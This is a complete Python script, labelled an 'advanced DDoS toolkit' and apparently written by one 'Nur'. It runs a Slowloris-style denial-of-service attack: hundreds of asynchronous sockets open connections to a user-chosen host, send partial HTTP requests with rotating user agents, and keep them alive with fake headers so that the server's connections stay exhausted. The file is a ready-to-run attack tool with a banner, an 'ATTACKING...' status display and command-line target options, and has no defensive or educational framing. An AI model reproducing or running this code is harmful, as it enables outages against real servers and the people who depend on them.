#!/usr/bin/env python3
import asyncio
import random
import socket
import sys
import argparse
import logging
import time

# ===== COLORS =====
G = '\033[1;32m' # Green
B = '\033[1;34m' # Blue
Y = '\033[1;33m' # Yellow
C = '\033[1;36m' # Cyan
W = '\033[1;37m' # White
R = '\033[1;31m' # Red
RESET = '\033[0m'

# ===== BIRD ASCII BANNER =====
BANNER = rf"""
{G}
                   _.:._
                 ."\ | /".
{B}.,__            "=.\:/.="            __,.
{Y} "=.`"=._          /^\          _.="`.=" 
{C}   ".'.'."=.=.=.=.     .'.'.'.'.'.'."
{G}     `~.`.`.`.`.`.`.   .'.'.'.'.'.~`
{B}        `~.` ` `.`.`   .'.'.'.'.~`
{C}            `=.-~~-._ ) ( _.-~~-.=`
{Y}                    \ /
{G}                     ( )
{B}                      Y

{W}=====================================
{C}         ADVANCED DDOS TOOLKIT
{G}          Creator: Nur
{W}=====================================
{R}    [ SENTRY-LORIS: HARDEND DDOS EDITION ]
{RESET}
"""

def slow_print(text):
    for c in text + "\n":
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.01)

# Configuration
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 13; Mobile; rv:109.0) Gecko/114.0 Firefox/114.0"
]

# Disable standard logging to keep the UI clean, we use custom print statements
logging.basicConfig(level=logging.ERROR)

class SentryLoris:
    def __init__(self, host, port, sockets, sleep_time):
        self.host = host
        self.port = port
        self.sockets_count = sockets
        self.sleep_time = sleep_time
        self.active_connections = 0

    async def create_connection(self):
        """Creates a single slow connection and keeps it alive."""
        while True:
            try:
                reader, writer = await asyncio.open_connection(self.host, self.port)
                self.active_connections += 1
                
                ua = random.choice(USER_AGENTS)
                payload = f"GET /?{random.randint(0, 99999)} HTTP/1.1\r\n"
                payload += f"Host: {self.host}\r\n"
                payload += f"User-Agent: {ua}\r\n"
                payload += "Accept-language: en-US,en;q=0.5\r\n"
                
                writer.write(payload.encode())
                await writer.drain()

                while True:
                    await asyncio.sleep(self.sleep_time)
                    keep_alive = f"X-Sentry-KeepAlive: {random.randint(1, 5000)}\r\n"
                    writer.write(keep_alive.encode())
                    await writer.drain()
            except Exception:
                self.active_connections -= 1
                break 

    async def run(self):
        print(f"{G}[+] Initializing attack on {W}{self.host}:{self.port}{RESET}")
        print(f"{G}[+] Spawning {W}{self.sockets_count}{G} concurrent sockets...{RESET}")
        
        tasks = []
        for _ in range(self.sockets_count):
            tasks.append(asyncio.create_task(self.create_connection()))
        
        while True:
            # Professional Status Line
            print(f"\r{C}[ STATUS ] {W}Connections: {G}{self.active_connections} {C}| {Y}Target: {W}{self.host} {C}| {R}ATTACKING...{RESET}", end="")
            await asyncio.sleep(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Sentry-Loris Mobile DDOS")
    parser.add_argument("host", help="Target IP or Domain")
    parser.add_argument("-p", "--port", default=80, type=int, help="Target Port (Default 80)")
    parser.add_argument("-s", "--sockets", default=500, type=int, help="Number of sockets (Default 500)")
    parser.add_argument("-t", "--time", default=15, type=int, help="Sleeptime between headers (Default 15)")
    args = parser.parse_args()

    # Print the custom visuals
    print(BANNER)
    slow_print(f"{Y}[*] Loading modules... Done")
    slow_print(f"{Y}[*] Establishing connection... Done")
    print(f"{R}--------------------------------------------------{RESET}\n")

    try:
        sl = SentryLoris(args.host, args.port, args.sockets, args.time)
        asyncio.run(sl.run())
    except KeyboardInterrupt:
        print(f"\n\n{R}[!] Attack halted by user.{RESET}")
        sys.exit()
